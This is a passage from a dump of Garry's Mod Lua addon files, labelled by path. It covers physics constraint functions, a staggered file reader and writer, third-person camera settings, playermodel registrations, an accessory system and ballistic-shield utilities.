	Ent2:DeleteOnRemove( axis )

	-- Create the constraint
	onStartConstraint( Ent1, Ent2 )

		local Constraint = ents.Create( "phys_torque" )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos1 )
		Constraint:SetKeyValue( "axis", tostring( WPos2 ) )
		Constraint:SetKeyValue( "force", torque )
		Constraint:SetKeyValue( "forcetime", forcetime )
		Constraint:SetKeyValue( "spawnflags", 4 )
		Constraint:SetPhysConstraintObjects( Phys1, Phys1 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )

	AddConstraintTableNoDelete( Ent1, Constraint, Ent2 )

	direction = direction or 1

	LocalAxis = Phys1:WorldToLocal( WPos2 )

	-- Delete the phys_torque too!
	axis:DeleteOnRemove( Constraint )

	-- Delete the axis constrain if phys_torque is deleted, with something like Motor tools reload
	Constraint:DeleteOnRemove( axis )

	local ctable = {
		Type = "Motor",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		friction = friction,
		torque = torque,
		forcetime = forcetime,
		nocollide = nocollide,
		toggle = toggle,
		pl = pl,
		forcelimit = forcelimit,
		forcescale = 0,
		direction = direction,
		is_on = false,
		numpadkey_fwd = numpadkey_fwd,
		numpadkey_bwd = numpadkey_bwd,
		LocalAxis = LocalAxis
	}

	Constraint:SetTable( ctable )

	if ( numpadkey_fwd ) then

		numpad.OnDown( pl, numpadkey_fwd, "MotorControl", Constraint, true, 1 )
		numpad.OnUp( pl, numpadkey_fwd, "MotorControl", Constraint, false, 1 )
	end

	if ( numpadkey_bwd ) then

		numpad.OnDown( pl, numpadkey_bwd, "MotorControl", Constraint, true, -1 )
		numpad.OnUp( pl, numpadkey_bwd, "MotorControl", Constraint, false, -1 )

	end

	return Constraint, axis

end
duplicator.RegisterConstraint( "Motor", Motor, "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "friction", "torque", "forcetime", "nocollide", "toggle", "pl", "forcelimit", "numpadkey_fwd", "numpadkey_bwd", "direction", "LocalAxis" )


--[[----------------------------------------------------------------------
	Pulley( ... )
	Creates a pulley constraint
------------------------------------------------------------------------]]
function Pulley( Ent1, Ent4, Bone1, Bone4, LPos1, LPos4, WPos2, WPos3, forcelimit, rigid, width, material )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent4, Bone4 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys4 = Ent4:GetPhysicsObjectNum( Bone4 )
	local WPos1 = Phys1:LocalToWorld( LPos1 )
	local WPos4 = Phys4:LocalToWorld( LPos4 )

	if ( Phys1 == Phys4 ) then return false end

	-- Make Constraint
	onStartConstraint( Ent1, Ent4 )

		local Constraint = ents.Create( "phys_pulleyconstraint" )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent4 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos2 )
		Constraint:SetKeyValue( "position2", tostring( WPos3 ) )
		Constraint:SetKeyValue( "ObjOffset1", tostring( LPos1 ) )
		Constraint:SetKeyValue( "ObjOffset2", tostring( LPos4 ) )
		Constraint:SetKeyValue( "forcelimit", forcelimit )
		Constraint:SetKeyValue( "addlength", ( WPos3 - WPos4 ):Length() )
		if ( rigid ) then Constraint:SetKeyValue( "spawnflags", 2 ) end
		Constraint:SetPhysConstraintObjects( Phys1, Phys4 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent4 )
	AddConstraintTable( Ent1, Constraint, Ent4 )

	local ctable = {
		Type = "Pulley",
		Ent1 = Ent1,
		Ent4 = Ent4,
		Bone1 = Bone1,
		Bone4 = Bone4,
		LPos1 = LPos1,
		LPos4 = LPos4,
		WPos2 = WPos2,
		WPos3 = WPos3,
		forcelimit = forcelimit,
		rigid = rigid,
		width = width,
		material = material
	}
	Constraint:SetTable( ctable )

	-- make Rope
	local World = game.GetWorld()

	local kv = {
		Collide = 1,
		Type = 2,
		Subdiv = 1,
	}

	CreateKeyframeRope( WPos1, width, material, Constraint, Ent1, LPos1, Bone1, World, WPos2, 0, kv )
	CreateKeyframeRope( WPos1, width, material, Constraint, World, WPos3, 0, World, WPos2, 0, kv )
	CreateKeyframeRope( WPos1, width, material, Constraint, World, WPos3, 0, Ent4, LPos4, Bone4, kv )

	return Constraint

end
duplicator.RegisterConstraint( "Pulley", Pulley, "Ent1", "Ent4", "Bone1", "Bone4", "LPos1", "LPos4", "WPos2", "WPos3", "forcelimit", "rigid", "width", "material" )


--[[----------------------------------------------------------------------
	Ballsocket( ... )
	Creates a Ballsocket constraint
------------------------------------------------------------------------]]
function Ballsocket( Ent1, Ent2, Bone1, Bone2, LPos, forcelimit, torquelimit, nocollide )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	-- Get information we're about to use
	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	local WPos = Phys2:LocalToWorld( LPos )

	if ( Phys1 == Phys2 ) then return false end

	onStartConstraint( Ent1, Ent2 )

		local Constraint = ents.Create("phys_ballsocket")
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(Constraint) then 
			onFinishConstraint( Ent1, Ent2 )
			return
		end
		
		ConstraintCreated( Constraint )
		Constraint:SetPos( WPos )
		if ( forcelimit && forcelimit > 0 ) then Constraint:SetKeyValue( "forcelimit", forcelimit ) end
		if ( torquelimit && torquelimit > 0 ) then Constraint:SetKeyValue( "torquelimit", torquelimit ) end
		if ( nocollide && nocollide > 0 ) then Constraint:SetKeyValue( "spawnflags", 1 ) end
		Constraint:SetPhysConstraintObjects( Phys1, Phys2 )
		Constraint:Spawn()
		Constraint:Activate()

	onFinishConstraint( Ent1, Ent2 )
	AddConstraintTable( Ent1, Constraint, Ent2 )

	local ctable = {
		Type = "Ballsocket",
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos = LPos,
		forcelimit = forcelimit,
		torquelimit = torquelimit,
		nocollide = nocollide
	}

	Constraint:SetTable( ctable )

	return Constraint

end
duplicator.RegisterConstraint( "Ballsocket", Ballsocket, "Ent1", "Ent2", "Bone1", "Bone2", "LPos", "forcelimit", "torquelimit", "nocollide" )


--[[----------------------------------------------------------------------
	Winch( ... )
	Creates a Winch constraint
------------------------------------------------------------------------]]
function Winch( pl, Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, width, fwd_bind, bwd_bind, fwd_speed, bwd_speed, material, toggle )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	-- local WPos1 = Phys1:LocalToWorld( LPos1 )
	-- local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end

	local const, dampen = CalcElasticConsts( Phys1, Phys2, Ent1, Ent2, false )

	local Constraint, rope = Elastic( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, const, dampen, 0, material, width, true )

	if ( !Constraint ) then return nil, rope end

	local ctable = {
		Type = "Winch",
		pl = pl,
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		width = width,
		fwd_bind = fwd_bind,
		bwd_bind = bwd_bind,
		fwd_speed = fwd_speed,
		bwd_speed = bwd_speed,
		material = material,
		toggle = toggle
	}
	Constraint:SetTable( ctable )

	-- Attach our Controller to the Elastic constraint
	local controller = ents.Create( "gmod_winch_controller" )
	
	-- Zombie: Why was this check not here? :)
	if !IsValid(controller) then 
		return
	end
	
	controller:SetConstraint( Constraint )
	controller:SetRope( rope )
	controller:Spawn()

	Constraint:DeleteOnRemove( controller )
	Ent1:DeleteOnRemove( controller )
	Ent2:DeleteOnRemove( controller )

	if ( toggle ) then

		numpad.OnDown( pl, fwd_bind, "WinchToggle", controller, 1 )
		numpad.OnDown( pl, bwd_bind, "WinchToggle", controller, -1 )

	else

		numpad.OnDown( pl, fwd_bind, "WinchOn", controller, 1 )
		numpad.OnUp( pl, fwd_bind, "WinchOff", controller )
		numpad.OnDown( pl, bwd_bind, "WinchOn", controller, -1 )
		numpad.OnUp( pl, bwd_bind, "WinchOff", controller )

	end

	return Constraint, rope, controller

end
duplicator.RegisterConstraint( "Winch", Winch, "pl", "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "width", "fwd_bind", "bwd_bind", "fwd_speed", "bwd_speed", "material", "toggle" )


--[[----------------------------------------------------------------------
	Hydraulic( ... )
	Creates a Hydraulic constraint
------------------------------------------------------------------------]]
function Hydraulic( pl, Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, Length1, Length2, width, key, fixed, speed, material, toggle )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	-- local WPos1 = Phys1:LocalToWorld( LPos1 )
	-- local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end
	if ( toggle == nil ) then toggle = true end -- Retain original behavior

	local const, dampn = CalcElasticConsts( Phys1, Phys2, Ent1, Ent2, fixed )

	local Constraint, rope = Elastic( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, const, dampn, 0, material, width, false )
	local ctable = {
		Type = "Hydraulic",
		pl = pl,
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		Length1 = Length1,
		Length2 = Length2,
		width = width,
		key = key,
		fixed = fixed,
		fwd_speed = speed,
		bwd_speed = speed,
		toggle = toggle,
		material = material
	}
	Constraint:SetTable( ctable )

	if ( Constraint && Constraint != rope ) then

		local slider

		if ( fixed == 1 ) then
			slider = Slider( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0 )
			
			-- Zombie: Why was this check not here? :)
			if !IsValid(slider) then 
				return
			end
		
			slider:SetTable( {} )
			Constraint:DeleteOnRemove( slider )
		end

		local controller = ents.Create( "gmod_winch_controller" )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(controller) then 
			return
		end
		
		if ( Length2 > Length1 ) then
			controller:SetKeyValue( "minlength", Length1 )
			controller:SetKeyValue( "maxlength", Length2 )
		else
			controller:SetKeyValue( "minlength", Length2 )
			controller:SetKeyValue( "maxlength", Length1 )
		end

		controller:SetConstraint( Constraint )
		controller:Spawn()

		Ent1:DeleteOnRemove( controller )
		Ent2:DeleteOnRemove( controller )

		Constraint:DeleteOnRemove( controller )

		if ( toggle ) then
			numpad.OnDown( pl, key, "HydraulicToggle", controller )
		else
			numpad.OnUp( pl, key, "HydraulicDir", controller, -1 )
			numpad.OnDown( pl, key, "HydraulicDir", controller, 1 )
		end

		return Constraint, rope, controller, slider
	else
		return Constraint, rope
	end

end
duplicator.RegisterConstraint( "Hydraulic", Hydraulic, "pl", "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "Length1", "Length2", "width", "key", "fixed", "fwd_speed", "material", "toggle" )


--[[----------------------------------------------------------------------
	Muscle( ... )
	Creates a Muscle constraint
------------------------------------------------------------------------]]
function Muscle( pl, Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, Length1, Length2, width, key, fixed, period, amplitude, starton, material )

	if ( !CanConstrain( Ent1, Bone1 ) ) then return false end
	if ( !CanConstrain( Ent2, Bone2 ) ) then return false end

	local Phys1 = Ent1:GetPhysicsObjectNum( Bone1 )
	local Phys2 = Ent2:GetPhysicsObjectNum( Bone2 )
	-- local WPos1 = Phys1:LocalToWorld( LPos1 )
	-- local WPos2 = Phys2:LocalToWorld( LPos2 )

	if ( Phys1 == Phys2 ) then return false end

	local const, dampn = CalcElasticConsts( Phys1, Phys2, Ent1, Ent2, fixed )

	local Constraint, rope = Elastic( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, const, dampn, 0, material, width, false )
	if ( !Constraint ) then return false end

	local ctable = {
		Type = "Muscle",
		pl = pl,
		Ent1 = Ent1,
		Ent2 = Ent2,
		Bone1 = Bone1,
		Bone2 = Bone2,
		LPos1 = LPos1,
		LPos2 = LPos2,
		Length1 = Length1,
		Length2 = Length2,
		width = width,
		key = key,
		fixed = fixed,
		period = period,
		amplitude = amplitude,
		toggle = true,
		starton = starton,
		material = material
	}
	Constraint:SetTable( ctable )

	local slider = nil

	if ( fixed == 1 ) then
		slider = Slider( Ent1, Ent2, Bone1, Bone2, LPos1, LPos2, 0 )
		
		-- Zombie: Why was this check not here? :)
		if !IsValid(slider) then 
			return
		end
		
		slider:SetTable( {} ) -- ??
		Constraint:DeleteOnRemove( slider )
	end

	local controller = ents.Create( "gmod_winch_controller" )
	
	-- Zombie: Why was this check not here? :)
	if !IsValid(controller) then 
		return
	end
	
	if ( Length2 > Length1 ) then
		controller:SetKeyValue( "minlength", Length1 )
		controller:SetKeyValue( "maxlength", Length2 )
	else
		controller:SetKeyValue( "minlength", Length2 )
		controller:SetKeyValue( "maxlength", Length1 )
	end
	controller:SetKeyValue( "type", 1 )
	controller:SetConstraint( Constraint )
	controller:Spawn()

	Ent1:DeleteOnRemove( controller )
	Ent2:DeleteOnRemove( controller )

	Constraint:DeleteOnRemove( controller )

	numpad.OnDown( pl, key, "MuscleToggle", controller )

	if ( starton ) then
		controller:SetDirection( 1 )
	end

	return Constraint, rope, controller, slider

end
duplicator.RegisterConstraint( "Muscle", Muscle, "pl", "Ent1", "Ent2", "Bone1", "Bone2", "LPos1", "LPos2", "Length1", "Length2", "width", "key", "fixed", "period", "amplitude", "starton", "material" )


--[[----------------------------------------------------------------------
	Returns true if this entity has valid constraints
------------------------------------------------------------------------]]
function HasConstraints( ent )

	if ( !ent ) then return false end
	if ( !ent.Constraints ) then return false end

	local count = 0
	for key, Constraint in pairs( ent.Constraints ) do

		if ( !IsValid( Constraint ) ) then

			ent.Constraints[ key ] = nil

		else

			count = count + 1

		end

	end

	return count != 0

end


--[[----------------------------------------------------------------------
	Returns this entities constraints table
	This is for the future, because ideally the constraints table will eventually look like this - and we won't have to build it every time.
------------------------------------------------------------------------]]
function GetTable( ent )

	if ( !HasConstraints( ent ) ) then return {} end

	local RetTable = {}

	for key, ConstraintEntity in pairs( ent.Constraints ) do

		local con = {}

		table.Merge( con, ConstraintEntity:GetTable() )

		con.Constraint = ConstraintEntity
		con.Entity = {}

		for i = 1, 6 do

			if ( con[ "Ent" .. i ] && ( con[ "Ent" .. i ]:IsWorld() or con[ "Ent" .. i ]:IsValid() ) ) then

				con.Entity[ i ] = {}
				con.Entity[ i ].Index = con[ "Ent" .. i ]:EntIndex()
				con.Entity[ i ].Entity = con[ "Ent" .. i ]
				con.Entity[ i ].Bone = con[ "Bone" .. i ]
				con.Entity[ i ].LPos = con[ "LPos" .. i ]
				con.Entity[ i ].WPos = con[ "WPos" .. i ]
				con.Entity[ i ].Length = con[ "Length" .. i ]
				con.Entity[ i ].World = con[ "Ent" .. i ]:IsWorld()

			end

		end

		table.insert( RetTable, con )

	end

	return RetTable

end

--[[----------------------------------------------------------------------
	Make this entity forget any constraints it knows about
------------------------------------------------------------------------]]
function ForgetConstraints( ent )

	ent.Constraints = {}

end


--[[----------------------------------------------------------------------
	Returns a list of constraints, by name
------------------------------------------------------------------------]]
function FindConstraints( ent, name )

	local ConTable = GetTable( ent )

	local Found = {}

	for k, con in ipairs( ConTable ) do

		if ( con.Type == name ) then
			table.insert( Found, con )
		end

	end

	return Found

end

--[[----------------------------------------------------------------------
	Returns the first constraint found by name
------------------------------------------------------------------------]]
function FindConstraint( ent, name )

	local ConTable = GetTable( ent )

	for k, con in ipairs( ConTable ) do

		if ( con.Type == name ) then
			return con
		end

	end

	return nil

end

--[[----------------------------------------------------------------------
	Returns the first constraint found by name
------------------------------------------------------------------------]]
function FindConstraintEntity( ent, name )

	local ConTable = GetTable( ent )

	for k, con in ipairs( ConTable ) do

		if ( con.Type == name ) then
			return con.Constraint
		end

	end

	return NULL

end

--[[----------------------------------------------------------------------
	Returns a table of all the entities constrained to ent
------------------------------------------------------------------------]]
function GetAllConstrainedEntities( ent, ResultTable )

	local ResultTable = ResultTable or {}

	if ( !IsValid( ent ) ) then return end
	if ( ResultTable[ ent ] ) then return end

	ResultTable[ ent ] = ent

	local ConTable = GetTable( ent )

	for k, con in ipairs( ConTable ) do

		for EntNum, Ent in pairs( con.Entity ) do
			GetAllConstrainedEntities( Ent.Entity, ResultTable )
		end

	end

	return ResultTable

end

--PATH addons/dash/lua/dash/extensions/file.lua:
local chunkSize		= 512 * 1024	-- Number of bytes to store in each chunk
local interval		= 0.1			-- Time between each chunk read/write
local workQueue = {}

local function processQueue(queue)
	if timer.Exists('file.DoStaggered') then return end
	if workQueue[1] then
		-- take something from the beginning of the queue and create
		-- a timer to repeatedly do it until it is odne
		local func = table.remove(workQueue, 1)
		timer.Create('file.DoStaggered', interval, 0, function()
			if func() then
				timer.Destroy('file.DoStaggered')
				processQueue()
			end
		end)
	else
		-- else there is no more work so we are done
		timer.Destroy('file.DoStaggered')
	end
end
function file.ReadStaggered(name, callback)
	-- open the file
	local f = file.Open(name, 'rb', 'DATA')
	if not f then error('failed to open file ' .. name .. '.') end

	-- we will construct a function
	-- to read the file in segments
	-- and call the callback when done
	do 
		local buffer = {}
		local function doRead()
			local data = f:Read(chunkSize)
			if not data or data:len() == 0 then
				f:Close()
				callback(table.concat(buffer))
				return true -- tell it to schedule the next job. this one is done.
			else
				buffer[#buffer + 1] = data
				return false
			end
		end
		table.insert(workQueue, doRead)
	end
	processQueue()
end

function file.WriteStaggered(name, str, callback)
	-- open the file
	local f = file.Open(name, 'wb', 'DATA')
	if not f then error('failed to open file ' .. name .. '.') end

	-- we will construct a function
	-- to read the file in segments
	-- and call the callback when done
	do 
		local len = str:len()
		local index = 0
		local function doWrite()
			local segment = string.sub(str, index * chunkSize, (index + 1) * chunkSize)
			f:Write(segment)
			index = index + 1
			if index * chunkSize > len then
				f:Close()
				callback(name)
				return true -- tell it to schedule the next job. this one is done.
			end
		end
		table.insert(workQueue, doWrite)
	end
	processQueue()
end
--PATH addons/__________tperson/lua/3tcore/sh_config.lua:
TPerson.DisableOnHolding = {
      ['gmod_camera'] = true
}

-- Default player settings
-- (Only used when player spawn for the first time on any server who have this addon and when player reset his settings )
TPerson.DefaultSettings = {
      ['key'] = 92, -- Default binding key to enable / disable third person
      ['allow'] = {
            ['third'] = true, -- Allow player to use third person
            ['crosshair1p'] = false, -- Allow crosshair on first person
            ['crosshair3p'] = false, -- Allow crosshair on third person
            ['cOnAiming'] = false, -- Allow crosshair on aiming
            ['tOnAiming'] = false, -- Allow third person on aiming
            ['tOnSpawn'] = false, -- Enable third person on player spawn / respawn
      },
      ['view'] = {
            ['right'] = 0, -- Camera right / left pos
            ['up'] = 4.5, -- Camero UP pos
            ['forward'] = -55, -- Camera forward pos
      },
      ['crosshair'] = {
            ['style'] = 1, -- Crosshair style
            ['sSpace'] = 1, -- Scale for space
            ['sWidth'] = 1, -- Scale for width
            ['sHeight'] = 1, -- Scale for height
            ['color'] = {
                  -- Color in rgba format
                  ['r'] = 0,
                  ['g'] = 255,
                  ['b'] = 0,
                  ['a'] = 255,
            },
      }
}
--PATH addons/__________tperson/lua/3tcore/vgui/cl_3tselector.lua:
local PANEL = {}
function PANEL:Init()
    self:GetVBar():SetWide(0)
    self.Layout = vgui.Create('DIconLayout', self)
    self.Layout:Dock(FILL)
    self.Layout:SetSpaceY(5)
    self.Layout:SetSpaceX(5)
    self.Choice = nil
    self.CrossHairColor = Color(0, 255, 0)
end

function PANEL:Add()
    local btn = self.Layout:Add('DCheckBox')
    return btn
end

function PANEL:SetCrossHairColor(color)
    if not color or not IsColor(color) then return end
    self.CrossHairColor = color
end

vgui.Register('3T:Selector', PANEL, 'DScrollPanel')
--PATH addons/ukrp_main_content/lua/autorun/afu_security_light.lua:
--Add Playermodel
player_manager.AddValidModel( "Ukrainian Soldier Light", "models/player/afu_security_light.mdl" )
--PATH addons/ukrp_main_content/lua/autorun/afu_security_standard.lua:
--Add Playermodel
player_manager.AddValidModel( "Ukrainian Soldier", "models/player/afu_security_standard.mdl" )
--PATH addons/shaccessorysystem/lua/accessory/cl_obj_player_extend.lua:
local meta = FindMetaTable("Player")

function meta:SH_AddAccessory(id, nopreview)
	local acc = SH_ACC:GetAccessory(id)
	if (!acc) then
		return false
	end

	self.SH_Accessories = self.SH_Accessories or {}

	if (self.SH_Accessories[id]) then
		return false
	end

	local mdl = acc.mdl:lower()
	local offset = SH_ACC:GetOffset(mdl, self)
	assert(offset, "model '" .. acc.mdl .. "' does not have a registered offset")

	local cs = ents.CreateClientProp()
	if (IsValid(cs)) then
		cs.m_sAccOwner = self:SteamID()
		cs.m_iOccupiedSlots = acc.slots
		cs.m_Offset = offset
		cs.m_sModel = mdl
		cs.m_JobNames = acc.jobs or nil
		cs.m_JobNamesExclude = acc.jobsexclude or nil
		cs:SetModel(mdl)
		cs:SetNoDraw(true)
		cs:SetSkin(acc.skin)
		-- TODO: bodygroups
		cs:SetMaterial(acc.material)
		cs:SetColor(acc.color)
		cs:SetModelScale(acc.scale, 0)
		cs:SetPredictable(false)
		cs:DrawShadow(false)
		cs:DestroyShadow()
		cs:SetMoveType(MOVETYPE_NONE)
		cs:Spawn()

		self.SH_Accessories[id] = cs
	end

	-- Network adjustment if need be
	if (!nopreview and self == LocalPlayer() and self:SH_CanAdjustAccessories()) then
		self:SH_BroadcastAdjustment(mdl)
	end

	return cs
end

function meta:SH_RemoveAccessory(id)
	self.SH_Accessories = self.SH_Accessories or {}

	if (!self.SH_Accessories[id]) then
		return false
	end

	SafeRemoveEntity(self.SH_Accessories[id])
	self.SH_Accessories[id] = nil

	return true
end

function meta:SH_RemoveAllAccessories(id)
	if (!self.SH_Accessories) then
		return false
	end

	for id, cs in pairs (self.SH_Accessories) do
		SafeRemoveEntity(cs)
	end
	self.SH_Accessories = {}

	return true
end

function meta:SH_ResetAdjustments(mdl)
	if (!self.SH_AccessoryAdjust) then
		return end

	self.SH_AccessoryAdjust[mdl] = nil
	self:SH_SaveAdjustments()

	net.Start("SH_ACC_ADJUST_RESET")
		net.WriteString(mdl)
	net.SendToServer()
end

function meta:SH_SaveAdjustments()
	if (!self.SH_AccessoryAdjust) then
		return end

	local tosave = {}

	for mdl, adj in pairs (self.SH_AccessoryAdjust) do
		tosave[mdl] = {
			px = adj.px or 0,
			py = adj.py or 0,
			pz = adj.pz or 0,
			ax = adj.ax or 0,
			ay = adj.ay or 0,
			az = adj.az or 0,
			sx = adj.sx or 1,
			sy = adj.sy or 1,
			sz = adj.sz or 1,
		}

		local t = tosave[mdl]
		if (t.px == 0 and t.py == 0 and t.pz == 0 and t.ax == 0 and t.ay == 0 and t.az == 0 and t.sx == 1 and t.sy == 1 and t.sz == 1) then
			continue end -- gtho
	end

	file.Write("sh_accessory_adjustments.txt", util.TableToJSON(tosave))
end

function meta:SH_BroadcastAdjustment(mdl)
	local adj = self.SH_AccessoryAdjust[mdl]
	if (adj) then
		net.Start("SH_ACC_ADJUST")
			net.WriteString(mdl)

			net.WriteVector(Vector(adj.px or 0, adj.py or 0, adj.pz or 0))
			net.WriteAngle(Angle(adj.ax or 0, adj.ay or 0, adj.az or 0))
			net.WriteVector(Vector(adj.sx or 0, adj.sy or 0, adj.sz or 0))
		net.SendToServer()
	end
end

--PATH addons/_ballistic_shields/lua/ballistic_shields/cl_bs_util.lua:
if SERVER then return end
include( "bs_config.lua" )
net.Receive( "bs_shield_info", function() LocalPlayer().bs_shieldIndex = net.ReadUInt( 16 ) end )
local Delay = 0
function bshields_materials_reload()
	for _, v in pairs( bshields.materialstoload ) do
		Delay = Delay + 0.2
		timer.Simple( Delay, function() surface.GetURL( v[1], v[2], v[3] ) end )
	end

	bshields.hshield_webmat = surface.GetURL( bshields.config.hShieldTexture, 256, 256 )
	bshields.rshield_webmat = surface.GetURL( bshields.config.rShieldTexture, 256, 256 )
	bshields.dshield_webmat = surface.GetURL( bshields.config.dShieldTexture, 256, 256 )
end

bshields.materialstoload = { { bshields.config.hShieldTexture, 256, 256 }, { bshields.config.rShieldTexture, 256, 256 }, { bshields.config.dShieldTexture, 256, 256 } }
hook.Add( "InitPostEntity", "bshields_init_client", function() bshields_materials_reload() end )
--PATH addons/_ballistic_shields/lua/ballistic_shields/sh_bs_util.lua:
bshields = bshields or {}
bshields.config = bshields.config or {}
bshields.shields = {
	{
		[1] = {
			["angles"] = Angle( 4, 6, -14 ),
			["position"] = Vector( 0, 8, -1 )
		},
		[2] = {
			["angles"] = Angle( 6, 6, -12 ),
			["position"] = Vector( 8, 10, -4 )
		},
		[3] = {
			["angles"] = Angle( -3, 7, -16 ),
			["position"] = Vector( -1, 4, -3 )
		}
	},
	{
		[1] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 6, -4, -8 )
		},
		[2] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 16, -3, -12 )
		},
		[3] = {
			["angles"] = Angle( -12, 0, 0 ),
			["position"] = Vector( 6, -3, -12 )
		}
	},
	{
		[1] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -7, -13 )
		},
		[2] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -6, -22 )
		},
		[3] = {
			["angles"] = Angle( 70, 78, -16 ),
			["position"] = Vector( 1, -8, -12 )
		}
	}
}
--PATH addons/__main/lua/autorun/cl_mas_ninjaskunai_options.lua:
/*

 ██████╗██████╗ ███████╗ █████╗ ████████╗███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ 
██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗██╔══██╗██╔══██╗████╗  ██║╚══███╔╝██╔═══██╗
██║     ██████╔╝█████╗  ███████║   ██║   █████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔████╔██║███████║██████╔╝███████║██╔██╗ ██║  ███╔╝ ██║   ██║
██║     ██╔══██╗██╔══╝  ██╔══██║   ██║   ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║██╔══██╗██╔══██║██║╚██╗██║ ███╔╝  ██║   ██║
╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║██║ ╚████║███████╗╚██████╔╝
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ 

------------------------------------------------------------------------------------------------------------------------------------------------------

██████╗  ██████╗     ███╗   ██╗ ██████╗ ████████╗    ██████╗ ███████╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗                               
██╔══██╗██╔═══██╗    ████╗  ██║██╔═══██╗╚══██╔══╝    ██╔══██╗██╔════╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗                              
██║  ██║██║   ██║    ██╔██╗ ██║██║   ██║   ██║       ██████╔╝█████╗  ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║                              
██║  ██║██║   ██║    ██║╚██╗██║██║   ██║   ██║       ██╔══██╗██╔══╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║                              
██████╔╝╚██████╔╝    ██║ ╚████║╚██████╔╝   ██║       ██║  ██║███████╗╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝                              
╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                               

██╗███╗   ██╗     █████╗ ███╗   ██╗██╗   ██╗    ███████╗██╗  ██╗ █████╗ ██████╗ ███████╗     ██████╗ ██████╗     ███████╗ ██████╗ ██████╗ ███╗   ███╗
██║████╗  ██║    ██╔══██╗████╗  ██║╚██╗ ██╔╝    ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝    ██╔═══██╗██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗████╗ ████║
██║██╔██╗ ██║    ███████║██╔██╗ ██║ ╚████╔╝     ███████╗███████║███████║██████╔╝█████╗      ██║   ██║██████╔╝    █████╗  ██║   ██║██████╔╝██╔████╔██║
██║██║╚██╗██║    ██╔══██║██║╚██╗██║  ╚██╔╝      ╚════██║██╔══██║██╔══██║██╔═══╝ ██╔══╝      ██║   ██║██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║
